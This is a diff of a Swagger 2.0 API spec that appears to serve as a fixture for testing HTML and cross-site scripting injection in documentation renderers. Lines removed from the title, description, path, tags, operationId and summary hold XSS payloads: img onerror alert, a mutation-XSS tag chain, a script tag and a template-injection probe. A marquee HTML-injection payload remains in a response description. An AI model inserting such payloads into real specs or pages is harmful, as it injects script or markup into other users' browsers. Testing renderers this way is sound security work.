@@ -1,15 +1,13 @@
 swagger: '2.0'
 info:
-  title: Example '"><img src=x onerror=alert(1)>
+  title: HTML Injection
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(document.domain)'>">
+    Teste
 paths:
-  /accounts'"><img src=x onerror=alert(1)>:
+  /accounts:
     get:
       responses:
         '200':
-          description: No response was specified'"><script>alert(1)</script>${{7*7}}<marquee>Hacked</marquee>
+          description: '"><h1><marquee>Hacked</marquee></h1>
       tags:
-        - accounts'"><img src=x onerror=alert(1)>
-      operationId: findAccounts'"><img src=x onerror=alert(1)>
-      summary: Finds all accounts'"><img src=x onerror=alert(1)>
+        - accounts
